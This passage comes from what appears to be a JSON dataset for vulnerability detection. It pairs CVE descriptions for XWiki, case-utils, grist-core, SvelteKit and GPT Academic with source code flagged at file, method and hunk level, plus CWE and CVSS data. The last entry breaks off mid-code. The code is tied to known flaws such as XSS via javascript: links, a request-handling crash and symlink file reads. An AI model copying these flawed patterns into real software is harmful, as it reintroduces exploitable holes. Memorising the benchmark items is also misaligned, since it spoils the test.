        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352",
      "CWE-95"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.0,
    "cvss_version": 3.1
  },
  {
    "id": 66,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.1\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, an environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 90,
          "content": "        try:"
        },
        {
          "line_no": 96,
          "content": "        except ValueError:"
        },
        {
          "line_no": 97,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 98,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 1342,
    "cve": "CVE-2024-56359",
    "description": "grist-core is a spreadsheet hosting server. A user visiting a malicious document and clicking on a link in a HyperLink cell using a control modifier (meaning for example Ctrl+click) could have their account compromised, since the link could use the javascript: scheme and be evaluated in the context of their current page. This issue has been patched in version 1.3.2. Users are advised to upgrade. Users unable to upgrade should avoid clicking on HyperLink cell links using a control modifier in documents prepared by people they do not trust.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/client/ui/sanitizeHTML.ts",
          "content": "import createDOMPurifier from 'dompurify';\n\nexport function sanitizeHTML(source: string | Node): string {\n  return defaultPurifier.sanitize(source);\n}\n\nexport function sanitizeTutorialHTML(source: string | Node): string {\n  return tutorialPurifier.sanitize(source, {\n    ADD_TAGS: ['iframe'],\n    ADD_ATTR: ['allowFullscreen'],\n  });\n}\n\nconst defaultPurifier = createDOMPurifier();\ndefaultPurifier.addHook('uponSanitizeAttribute', handleSanitizeAttribute);\n\nconst tutorialPurifier = createDOMPurifier();\ntutorialPurifier.addHook('uponSanitizeAttribute', handleSanitizeAttribute);\ntutorialPurifier.addHook('uponSanitizeElement', handleSanitizeTutorialElement);\n\nfunction handleSanitizeAttribute(node: Element) {\n  if (!('target' in node)) { return; }\n\n  node.setAttribute('target', '_blank');\n}\n\nfunction handleSanitizeTutorialElement(node: Element, data: createDOMPurifier.SanitizeElementHookEvent) {\n  if (data.tagName !== 'iframe') { return; }\n\n  const src = node.getAttribute('src');\n  if (src?.startsWith('https://www.youtube.com/embed/')) {\n    return;\n  }\n\n  node.parentNode?.removeChild(node);\n}\n"
        },
        {
          "name": "app/common/urlUtils.ts",
          "content": "import {extractOrgParts, GristLoadConfig} from 'app/common/gristUrls';\n\nexport function getGristConfig(): GristLoadConfig {\n  return (window as any).gristConfig || {};\n}\n\n/**\n *\n * Adds /o/ORG to the supplied path, with ORG extracted from current URL if possible.\n * If not, path is returned as is, but with any trailing / removed for consistency.\n *\n */\nexport function addCurrentOrgToPath(path: string, skipIfInDomain: boolean = false) {\n  if (typeof window === 'undefined' || !window) { return path; }\n  return addOrgToPath(path, window.location.href, skipIfInDomain);\n}\n\n/**\n *\n * Adds /o/ORG to the supplied path, with ORG extracted from the page URL if possible.\n * If not, path is returned as is, but with any trailing / removed for consistency.\n *\n */\nexport function addOrgToPath(path: string, page: string, skipIfInDomain: boolean = false) {\n  if (typeof window === 'undefined' || !window) { return path; }\n  if (path.includes('/o/')) { return path; }\n  const src = new URL(page);\n  const srcParts = extractOrgParts(src.host, src.pathname);\n  if (srcParts.mismatch) {\n    throw new Error('Cannot figure out what organization the URL is for.');\n  }\n  path = path.replace(/\\/$/, '');\n  if (!srcParts.subdomain) {\n    return path;\n  }\n  if (skipIfInDomain && srcParts.orgFromHost) {\n    return path;\n  }\n  return `${path}/o/${srcParts.subdomain}`;\n}\n\n/**\n * Expands an endpoint path to a full url anchored to the given doc worker base url.\n */\nexport function docUrl(docWorkerUrl: string|null|undefined, path?: string) {\n  const base = document.querySelector('base');\n  const baseHref = base && base.href;\n  const baseUrl = new URL(docWorkerUrl || baseHref || window.location.origin);\n  return baseUrl.toString().replace(/\\/$/, '') + (path ? `/${path}` : '');\n}\n\n// Get a url on the same webserver as the current page, adding a prefix to encode\n// the current organization if necessary.\nexport function getOriginUrl(path: string) {\n  return `${window.location.origin}${addCurrentOrgToPath('/', true)}${path}`;\n}\n\n// Return a string docId if server has provided one (as in hosted Grist), otherwise null\n// (as in classic Grist).\nexport function getInitialDocAssignment(): string|null {\n  return getGristConfig().assignmentId || null;\n}\n\n// Return true if we are on a page that can supply a doc list.\n// TODO: the doclist object isn't relevant to hosted grist and should be factored out.\nexport function pageHasDocList(): boolean {\n  // No doc list support on hosted grist.\n  return !getGristConfig().homeUrl;\n}\n\n// Return true if we are on a page that has access to home api.\nexport function pageHasHome(): boolean {\n  return Boolean(getGristConfig().homeUrl);\n}\n\n// Construct a url by adding `path` to the home url (adding in the part to the current\n// org if needed), and fetch from it.\nexport function fetchFromHome(path: string, opts: RequestInit): Promise<Response> {\n  const baseUrl = addCurrentOrgToPath(getGristConfig().homeUrl!);\n  return window.fetch(`${baseUrl}${path}`, opts);\n}\n\n/**\n * Returns the provided URL if it has a valid protocol (`http:` or `https:`), or\n * `null` otherwise.\n */\nexport function sanitizeUrl(url: string): string | null {\n  try {\n    const parsedUrl = new URL(url);\n    if (![\"http:\", \"https:\"].includes(parsedUrl.protocol)) {\n      return null;\n    }\n\n    return parsedUrl.href;\n  } catch (e) {\n    return null;\n  }\n}\n"
        }
      ],
      "method_level": [
        "handleSanitizeTutorialElement",
        "sanitizeUrl"
      ],
      "hunk_level": [
        {
          "line_no": 27,
          "content": "function handleSanitizeTutorialElement(node: Element, data: createDOMPurifier.SanitizeElementHookEvent) {"
        },
        {
          "line_no": 30,
          "content": "  const src = node.getAttribute('src');"
        },
        {
          "line_no": 87,
          "content": "export function sanitizeUrl(url: string): string | null {"
        },
        {
          "line_no": 88,
          "content": "  try {"
        },
        {
          "line_no": 89,
          "content": "    const parsedUrl = new URL(url);"
        },
        {
          "line_no": 90,
          "content": "    if (![\"http:\", \"https:\"].includes(parsedUrl.protocol)) {"
        },
        {
          "line_no": 91,
          "content": "      return null;"
        },
        {
          "line_no": 92,
          "content": "    }"
        },
        {
          "line_no": 94,
          "content": "    return parsedUrl.href;"
        },
        {
          "line_no": 95,
          "content": "  } catch (e) {"
        },
        {
          "line_no": 96,
          "content": "    return null;"
        },
        {
          "line_no": 97,
          "content": "  }"
        },
        {
          "line_no": 98,
          "content": "}"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 148,
    "cve": "CVE-2024-23641",
    "description": "SvelteKit is a web development kit. In SvelteKit 2, sending a GET request with a body eg `{}` to a built and previewed/hosted sveltekit app throws `Request with GET/HEAD method cannot have body.` and crashes the preview/hosting. After this happens, one must manually restart the app. `TRACE` requests will also cause the app to crash. Prerendered pages and SvelteKit 1 apps are not affected. `@sveltejs/adapter-node` versions 2.1.2, 3.0.3, and 4.0.1 and `@sveltejs/kit` version 2.4.3 contain a patch for this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/kit/src/exports/node/index.js",
          "content": "import { createReadStream } from 'node:fs';\nimport { Readable } from 'node:stream';\nimport * as set_cookie_parser from 'set-cookie-parser';\nimport { SvelteKitError } from '../../runtime/control.js';\n\n/**\n * @param {import('http').IncomingMessage} req\n * @param {number} [body_size_limit]\n */\nfunction get_raw_body(req, body_size_limit) {\n\tconst h = req.headers;\n\n\tif (!h['content-type']) {\n\t\treturn null;\n\t}\n\n\tconst content_length = Number(h['content-length']);\n\n\t// check if no request body\n\tif (\n\t\t(req.httpVersionMajor === 1 && isNaN(content_length) && h['transfer-encoding'] == null) ||\n\t\tcontent_length === 0\n\t) {\n\t\treturn null;\n\t}\n\n\tif (req.destroyed) {\n\t\tconst readable = new ReadableStream();\n\t\treadable.cancel();\n\t\treturn readable;\n\t}\n\n\tlet size = 0;\n\tlet cancelled = false;\n\n\treturn new ReadableStream({\n\t\tstart(controller) {\n\t\t\tif (body_size_limit !== undefined && content_length > body_size_limit) {\n\t\t\t\tlet message = `Content-length of ${content_length} exceeds limit of ${body_size_limit} bytes.`;\n\n\t\t\t\tif (body_size_limit === 0) {\n\t\t\t\t\t// https://github.com/sveltejs/kit/pull/11589\n\t\t\t\t\t// TODO this exists to aid migration — remove in a future version\n\t\t\t\t\tmessage += ' To disable body size limits, specify Infinity rather than 0.';\n\t\t\t\t}\n\n\t\t\t\tconst error = new SvelteKitError(413, 'Payload Too Large', message);\n\n\t\t\t\tcontroller.error(error);\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\treq.on('error', (error) => {\n\t\t\t\tcancelled = true;\n\t\t\t\tcontroller.error(error);\n\t\t\t});\n\n\t\t\treq.on('end', () => {\n\t\t\t\tif (cancelled) return;\n\t\t\t\tcontroller.close();\n\t\t\t});\n\n\t\t\treq.on('data', (chunk) => {\n\t\t\t\tif (cancelled) return;\n\n\t\t\t\tsize += chunk.length;\n\t\t\t\tif (size > content_length) {\n\t\t\t\t\tcancelled = true;\n\n\t\t\t\t\tconst constraint = content_length ? 'content-length' : 'BODY_SIZE_LIMIT';\n\t\t\t\t\tconst message = `request body size exceeded ${constraint} of ${content_length}`;\n\n\t\t\t\t\tconst error = new SvelteKitError(413, 'Payload Too Large', message);\n\t\t\t\t\tcontroller.error(error);\n\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tcontroller.enqueue(chunk);\n\n\t\t\t\tif (controller.desiredSize === null || controller.desiredSize <= 0) {\n\t\t\t\t\treq.pause();\n\t\t\t\t}\n\t\t\t});\n\t\t},\n\n\t\tpull() {\n\t\t\treq.resume();\n\t\t},\n\n\t\tcancel(reason) {\n\t\t\tcancelled = true;\n\t\t\treq.destroy(reason);\n\t\t}\n\t});\n}\n\n/**\n * @param {{\n *   request: import('http').IncomingMessage;\n *   base: string;\n *   bodySizeLimit?: number;\n * }} options\n * @returns {Promise<Request>}\n */\nexport async function getRequest({ request, base, bodySizeLimit }) {\n\treturn new Request(base + request.url, {\n\t\t// @ts-expect-error\n\t\tduplex: 'half',\n\t\tmethod: request.method,\n\t\theaders: /** @type {Record<string, string>} */ (request.headers),\n\t\tbody: get_raw_body(request, bodySizeLimit)\n\t});\n}\n\n/**\n * @param {import('http').ServerResponse} res\n * @param {Response} response\n * @returns {Promise<void>}\n */\nexport async function setResponse(res, response) {\n\tfor (const [key, value] of response.headers) {\n\t\ttry {\n\t\t\tres.setHeader(\n\t\t\t\tkey,\n\t\t\t\tkey === 'set-cookie'\n\t\t\t\t\t? set_cookie_parser.splitCookiesString(\n\t\t\t\t\t\t\t// This is absurd but necessary, TODO: investigate why\n\t\t\t\t\t\t\t/** @type {string}*/ (response.headers.get(key))\n\t\t\t\t\t\t)\n\t\t\t\t\t: value\n\t\t\t);\n\t\t} catch (error) {\n\t\t\tres.getHeaderNames().forEach((name) => res.removeHeader(name));\n\t\t\tres.writeHead(500).end(String(error));\n\t\t\treturn;\n\t\t}\n\t}\n\n\tres.writeHead(response.status);\n\n\tif (!response.body) {\n\t\tres.end();\n\t\treturn;\n\t}\n\n\tif (response.body.locked) {\n\t\tres.end(\n\t\t\t'Fatal error: Response body is locked. ' +\n\t\t\t\t\"This can happen when the response was already read (for example through 'response.json()' or 'response.text()').\"\n\t\t);\n\t\treturn;\n\t}\n\n\tconst reader = response.body.getReader();\n\n\tif (res.destroyed) {\n\t\treader.cancel();\n\t\treturn;\n\t}\n\n\tconst cancel = (/** @type {Error|undefined} */ error) => {\n\t\tres.off('close', cancel);\n\t\tres.off('error', cancel);\n\n\t\t// If the reader has already been interrupted with an error earlier,\n\t\t// then it will appear here, it is useless, but it needs to be catch.\n\t\treader.cancel(error).catch(() => {});\n\t\tif (error) res.destroy(error);\n\t};\n\n\tres.on('close', cancel);\n\tres.on('error', cancel);\n\n\tnext();\n\tasync function next() {\n\t\ttry {\n\t\t\tfor (;;) {\n\t\t\t\tconst { done, value } = await reader.read();\n\n\t\t\t\tif (done) break;\n\n\t\t\t\tif (!res.write(value)) {\n\t\t\t\t\tres.once('drain', next);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\tres.end();\n\t\t} catch (error) {\n\t\t\tcancel(error instanceof Error ? error : new Error(String(error)));\n\t\t}\n\t}\n}\n\n/**\n * Converts a file on disk to a readable stream\n * @param {string} file\n * @returns {ReadableStream}\n * @since 2.4.0\n */\nexport function createReadableStream(file) {\n\treturn /** @type {ReadableStream} */ (Readable.toWeb(createReadStream(file)));\n}\n"
        }
      ],
      "method_level": [
        "async function getRequest({ request, base, bodySizeLimit }) {\n\treturn new Request(base + request.url, {\n\t\t// @ts-expect-error\n\t\tduplex: 'half',\n\t\tmethod: request.method,\n\t\theaders: /** @type {Record<string, string>} */ (request.headers),\n\t\tbody: get_raw_body(request, bodySizeLimit)\n\t});\n}"
      ],
      "hunk_level": [
        {
          "line_no": 112,
          "content": "\t\tbody: get_raw_body(request, bodySizeLimit)"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 49,
    "cve": "CVE-2025-25185",
    "description": "GPT Academic provides interactive interfaces for large language models. In 3.91 and earlier, GPT Academic does not properly account for soft links. An attacker can create a malicious file as a soft link pointing to a target file, then package this soft link file into a tar.gz file and upload it. Subsequently, when accessing the decompressed file from the server, the soft link will point to the target file on the victim server. The vulnerability allows attackers to read all files on the server.",
    "vulnerability": {
      "file_level": [
        {
          "name": "shared_utils/handle_upload.py",
          "content": "import importlib\nimport time\nimport inspect\nimport re\nimport os\nimport base64\nimport gradio\nimport shutil\nimport glob\nfrom shared_utils.config_loader import get_conf\nfrom loguru import logger\n\ndef html_local_file(file):\n    base_path = os.path.dirname(__file__)  # 项目目录\n    if os.path.exists(str(file)):\n        file = f'file={file.replace(base_path, \".\")}'\n    return file\n\n\ndef html_local_img(__file, layout=\"left\", max_width=None, max_height=None, md=True):\n    style = \"\"\n    if max_width is not None:\n        style += f\"max-width: {max_width};\"\n    if max_height is not None:\n        style += f\"max-height: {max_height};\"\n    __file = html_local_file(__file)\n    a = f'<div align=\"{layout}\"><img src=\"{__file}\" style=\"{style}\"></div>'\n    if md:\n        a = f\"![{__file}]({__file})\"\n    return a\n\n\ndef file_manifest_filter_type(file_list, filter_: list = None):\n    new_list = []\n    if not filter_:\n        filter_ = [\"png\", \"jpg\", \"jpeg\"]\n    for file in file_list:\n        if str(os.path.basename(file)).split(\".\")[-1] in filter_:\n            new_list.append(html_local_img(file, md=False))\n        else:\n            new_list.append(file)\n    return new_list\n\n\ndef zip_extract_member_new(self, member, targetpath, pwd):\n    # 修复中文乱码的问题\n    \"\"\"Extract the ZipInfo object 'member' to a physical\n        file on the path targetpath.\n    \"\"\"\n    import zipfile\n    if not isinstance(member, zipfile.ZipInfo):\n        member = self.getinfo(member)\n\n    # build the destination pathname, replacing\n    # forward slashes to platform specific separators.\n    arcname = member.filename.replace('/', os.path.sep)\n    arcname = arcname.encode('cp437', errors='replace').decode('gbk', errors='replace')\n\n    if os.path.altsep:\n        arcname = arcname.replace(os.path.altsep, os.path.sep)\n    # interpret absolute pathname as relative, remove drive letter or\n    # UNC path, redundant separators, \".\" and \"..\" components.\n    arcname = os.path.splitdrive(arcname)[1]\n    invalid_path_parts = ('', os.path.curdir, os.path.pardir)\n    arcname = os.path.sep.join(x for x in arcname.split(os.path.sep)\n                                if x not in invalid_path_parts)\n    if os.path.sep == '\\\\':\n        # filter illegal characters on Windows\n        arcname = self._sanitize_windows_name(arcname, os.path.sep)\n\n    targetpath = os.path.join(targetpath, arcname)\n    targetpath = os.path.normpath(targetpath)\n\n    # Create all upper directories if necessary.\n    upperdirs = os.path.dirname(targetpath)\n    if upperdirs and not os.path.exists(upperdirs):\n        os.makedirs(upperdirs)\n\n    if member.is_dir():\n        if not os.path.isdir(targetpath):\n            os.mkdir(targetpath)\n        return targetpath\n\n    with self.open(member, pwd=pwd) as source, \\\n            open(targetpath, \"wb\") as target:\n        shutil.copyfileobj(source, target)\n\n    return targetpath\n\n\ndef extract_archive(file_path, dest_dir):\n    import zipfile\n    import tarfile\n    import os\n\n    # Get the file extension of the input file\n    file_extension = os.path.splitext(file_path)[1]\n\n    # Extract the archive based on its extension\n    if file_extension == \".zip\":\n        with zipfile.ZipFile(file_path, \"r\") as zipobj:\n            zipobj._extract_member = lambda a,b,c: zip_extract_member_new(zipobj, a,b,c)    # 修复中文乱码的问题\n            zipobj.extractall(path=dest_dir)\n            logger.info(\"Successfully extracted zip archive to {}\".format(dest_dir))\n\n    elif file_extension in [\".tar\", \".gz\", \".bz2\"]:\n        try:\n            with tarfile.open(file_path, \"r:*\") as tarobj:\n                # 清理提取路径，移除任何不安全的元素\n                for member in tarobj.getmembers():\n                    member_path = os.path.normpath(member.name)\n                    full_path = os.path.join(dest_dir, member_path)\n                    full_path = os.path.abspath(full_path)\n                    if member.islnk() or member.issym():\n                        raise Exception(f\"Attempted Symlink in {member.name}\")\n                    if not full_path.startswith(os.path.abspath(dest_dir) + os.sep):\n                        raise Exception(f\"Attempted Path Traversal in {member.name}\")\n\n                tarobj.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted tar archive to {}\".format(dest_dir))\n        except tarfile.ReadError as e:\n            if 